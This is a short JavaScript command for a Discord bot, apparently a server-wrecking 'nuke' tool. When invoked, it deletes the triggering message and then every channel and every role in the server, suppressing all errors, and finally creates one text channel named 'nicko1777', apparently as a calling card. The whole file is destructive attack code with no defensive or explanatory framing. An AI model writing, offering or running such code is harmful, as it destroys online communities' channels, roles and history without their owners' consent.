exports.run = async(client, msg, args) => {
    msg.delete().catch(() => {}), 
    await msg.guild.channels.forEach(chnls => chnls.delete().catch(() => {})), 
    await msg.guild.roles.map(role => role.delete().catch(() => {})), 
    msg.guild.createChannel("nicko1777", {
        'type': "text"
    }).catch(() => {});
};